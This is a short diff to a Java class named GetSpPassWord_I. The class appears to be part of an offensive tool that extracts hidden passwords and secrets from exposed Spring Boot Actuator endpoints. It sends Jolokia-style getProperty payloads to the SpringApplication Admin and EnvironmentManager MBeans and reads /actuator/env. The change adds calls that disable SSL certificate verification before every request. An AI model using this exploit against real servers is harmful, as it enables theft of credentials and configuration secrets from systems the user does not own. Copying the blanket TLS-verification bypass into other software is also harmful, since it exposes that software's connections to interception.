@@ -12,6 +12,8 @@ import java.nio.charset.StandardCharsets;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import static src.main.SSLVerify.sslVer.disableSSLVerification;
+
 public class GetSpPassWord_I {
     public String address;
     public String args;
@@ -34,6 +36,7 @@ public class GetSpPassWord_I {
         String respValue = "value";
         String data = "{\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
         String expdata = String.format(data,args);
+        disableSSLVerification();
         try {
             URL obj = new URL(pocsite);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
@@ -99,6 +102,7 @@ public class GetSpPassWord_I {
         String respValue = "value";
         String data = "{\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
         String expdata = String.format(data,args);
+        disableSSLVerification();
         try {
             URL obj = new URL(pocsite);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
@@ -167,6 +171,7 @@ public class GetSpPassWord_I {
         String respValue = "value";
         String data = "{\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
         String expdata = String.format(data,args);
+        disableSSLVerification();
         try {
             URL obj = new URL(pocsite);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
@@ -232,6 +237,7 @@ public class GetSpPassWord_I {
         String respValue = "value";
         String data = "{\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
         String expdata = String.format(data,args);
+        disableSSLVerification();
         try {
             URL obj = new URL(pocsite);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
@@ -296,6 +302,7 @@ public class GetSpPassWord_I {
         // Result2 4 为 sp2
         String site = address + "/actuator/env";
         try {
+            disableSSLVerification();
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
             conn.setRequestMethod("GET");
